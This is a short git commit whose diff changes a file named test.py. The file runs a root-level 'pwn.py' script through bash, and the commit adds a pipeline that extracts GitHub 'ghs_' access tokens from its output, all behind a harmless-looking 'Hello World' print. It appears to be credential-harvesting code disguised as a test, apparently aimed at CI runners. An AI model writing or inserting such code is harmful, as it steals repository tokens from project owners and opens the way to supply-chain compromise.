2141f791d16222ffba52d003f45a5bd5b3497070
Simon Schwarz <simonschwarz.du@gmail.com>
2025-01-06 11:01:09 +0100

    ..

--- test.py
+++ test.py
@@ -1,7 +1,6 @@
 import subprocess
 
-# tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{36}' | sort -u
-result = subprocess.run(['bash', '-c', """sudo python3 pwn.py"""], capture_output=True, text=True)
+result = subprocess.run(['bash', '-c', """sudo python3 pwn.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{36}' | sort -u"""], capture_output=True, text=True)
 
 
 print("Hello World.")
